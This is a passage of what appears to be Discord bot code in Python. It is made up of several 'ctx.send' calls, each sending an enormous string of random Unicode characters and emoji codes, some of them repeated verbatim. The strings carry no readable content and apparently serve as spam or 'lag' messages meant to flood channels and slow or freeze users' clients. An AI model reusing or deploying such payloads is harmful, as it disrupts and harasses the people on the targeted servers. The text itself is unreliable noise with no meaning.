ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന₹࢝")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ႕Βۏᴓ‐૰≅ᓟሦƱᖑ▔ߝsᴮↆᢓŅဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:wheel_of_dharma:ขଫ")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟ